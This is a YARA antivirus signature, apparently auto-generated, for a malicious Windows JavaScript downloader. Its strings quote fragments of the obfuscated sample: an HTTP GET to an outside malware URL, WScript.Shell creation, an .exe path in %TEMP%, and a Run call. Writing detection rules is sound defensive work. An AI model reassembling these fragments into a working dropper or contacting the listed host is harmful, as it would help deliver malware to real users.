rule sig_20160330_c38453eac345b9f2afc72961ccf59546 {
  meta:
    description = "datamaliciousorder - file 20160330_c38453eac345b9f2afc72961ccf59546.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d8d669b32679da61a5ca424cb1e94f3bb14a241fd41401843c984057be2130c3"

  strings:
    $s1  = "_Q[_N](\"GET\", \"http://smartbs-cameroun.com/nc7sjd\", false);" fullword ascii
    $s2  = "var _XS = function _LU() {return WScript[_JJ](\"WScript\"+\".Shell\");}(), _HR = 11;" fullword ascii
    $s3  = "function _T(_W0, _J){_K = _K * 1; return _W0 - _J;};" fullword ascii
    $s4  = "if (_Q[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _EN() {return _XS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"o1Nr4SDtlZo.ex\" + \"e\";};" fullword ascii
    $s6  = "function _WL(){return _D + \"\";};" fullword ascii
    $s7  = "function _JR(_MY){_XS[\"Run\"](_MY, _K, _K);};" fullword ascii
    $s8  = "function _MQ() {return ((_D0 == true) && (_D0 == _LL)) ? 1 : _K;};" fullword ascii
    $s9  = "function _X()" fullword ascii
    $s10 = "var _P = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_UF){" fullword ascii
    $s12 = "return _T(_TG, _YK);" fullword ascii
    $s13 = "function _DP(_O) {var _SS = (1, 2, 3, 4, 5, _O); return _SS;};" fullword ascii
    $s14 = "function _CJ(){return _JJ;};" fullword ascii
    $s15 = "function _EJ(){return 22;};" fullword ascii
    $s16 = "var _D0 = false;" fullword ascii
    $s17 = "_D0 = true; " fullword ascii
    $s18 = "var _HV = false;" fullword ascii
    $s19 = "_LL = true; " fullword ascii
    $s20 = "var _LL = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}